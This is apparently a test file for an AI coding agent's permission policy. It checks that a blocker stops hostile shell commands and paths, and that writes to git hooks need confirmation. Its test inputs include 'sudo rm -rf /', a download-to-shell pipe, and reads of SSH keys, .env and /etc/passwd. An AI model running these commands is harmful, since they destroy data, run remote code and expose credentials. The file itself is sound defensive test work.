import { assert, eq, test } from "../shared/assertions.mjs";
import { importModule as load } from "../shared/jiti-loader.mjs";

const workflowPolicy = await load("extensions/permissions/workflow-policy.ts");
const permissionPolicy = await load("extensions/shared/permission-policy.ts");

await test("hard shell boundaries hold at every permission level", () => {
  if (!workflowPolicy) return;
  const blocked = (command) => workflowPolicy.assessBash(command).blocked;
  assert(blocked("sudo rm -rf /"), "elevated rights are a hard block");
  assert(
    blocked("apt-get install curl"),
    "system package operations are a hard block",
  );
  assert(
    blocked("curl https://example.test/x.sh | sh"),
    "download-to-shell is a hard block",
  );
  assert(blocked("cat ~/.ssh/id_rsa"), "credential files are a hard block");
  // Everything softer is the permission level's decision, not this layer's:
  // these must pass through so decideBash can ask, allow or block per level.
  assert(!blocked("git status"), "an ordinary read passes through");
  assert(!blocked("npm install zod"), "an ordinary mutation passes through");
  assert(
    !blocked("printf changed > x"),
    "a redirection passes through to the level policy",
  );
});

await test("hard path boundaries block secrets and anything outside the project", () => {
  if (!workflowPolicy) return;
  const cwd = process.cwd();
  const assess = (toolName, path) =>
    workflowPolicy.assessWorkflowTool({ toolName, input: { path } }, cwd);
  assert(
    assess("write", "/etc/passwd").blocked,
    "a write outside the project is a hard block",
  );
  assert(
    assess("write", "../escape.txt").blocked,
    "a relative escape from the project is a hard block",
  );
  assert(assess("read", ".env").blocked, "a secret file is a hard block");
  assert(
    !assess("write", "extensions/example.ts").blocked,
    "a project write passes through to the level policy",
  );
});

await test("writes to in-project execution paths need confirmation, YOLO refuses them", () => {
  if (!permissionPolicy) return;
  const cwd = process.cwd();
  const decide = (level, path) =>
    permissionPolicy.decideFileAccess(level, "write", path, cwd).action;
  for (const path of [
    ".git/hooks/pre-commit",
    ".git/config",
    ".pi/lsp.json",
    ".pi/verify.json",
  ]) {
    eq(
      decide("project-write", path),
      "ask",
      `${path} turns a write into later execution and must be confirmed`,
    );
    eq(
      decide("yolo", path),
      "block",
      `${path} stays refused under the temporary YOLO bypass`,
    );
  }
  eq(
    decide("project-write", "extensions/example.ts"),
    "allow",
    "an ordinary project file is unaffected",
  );
  eq(
    decide("project-write", ".pi/setup.json"),
    "allow",
    "a .pi file that executes nothing stays an ordinary write",
  );
  eq(
    decide("project-write", "src/.gitignore"),
    "allow",
    "the guard matches the .git directory, not every name starting with .git",
  );
});

await test("containsUnquotedVariableExpansion detects real shell expansion, not literal text", () => {
  if (!permissionPolicy) return;
  assert(
    permissionPolicy.containsUnquotedVariableExpansion("cat $HOME/x"),
    "bare $NAME is detected",
  );
  assert(
    permissionPolicy.containsUnquotedVariableExpansion('cat "$PWD/x"'),
    "double-quoted $NAME is still expanded by a shell",
  );
  assert(
    permissionPolicy.containsUnquotedVariableExpansion("cat ${HOME}/x"),
    "${NAME} form is detected",
  );
  assert(
    !permissionPolicy.containsUnquotedVariableExpansion("cat '$HOME/x'"),
    "single-quoted $ is literal, not expansion",
  );
  assert(
    !permissionPolicy.containsUnquotedVariableExpansion("cat \\$HOME"),
    "backslash-escaped $ is literal, not expansion",
  );
  assert(
    !permissionPolicy.containsUnquotedVariableExpansion("echo cost is \\$5"),
    "a $ not followed by a name character is not a variable reference",
  );
});

await test("decideBash asks or blocks on unquoted shell variables at every non-readonly level, and readonly denies them", () => {
  if (!permissionPolicy) return;
  const cwd = process.cwd();
  eq(
    permissionPolicy.decideBash("readonly", "cat $HOME/x", cwd).action,
    "block",
    "readonly cannot prove $HOME stays inside the project",
  );
  eq(
    permissionPolicy.decideBash("project-write", "cat $HOME/x", cwd).action,
    "ask",
    "project-write must ask instead of silently resolving $HOME",
  );
  eq(
    permissionPolicy.decideBash("confirm-all", "cat $HOME/x", cwd).action,
    "ask",
    "confirm-all must ask instead of silently resolving $HOME",
  );
  eq(
    permissionPolicy.decideBash("yolo", "touch $HOME/pi-policy-audit", cwd)
      .action,
    "block",
    "yolo's hard project boundary must not be bypassable via $HOME",
  );
  eq(
    permissionPolicy.decideBash("project-write", "cat '$HOME/x'", cwd).action,
    "allow",
    "single-quoted $HOME never expands and stays allowed",
  );
});
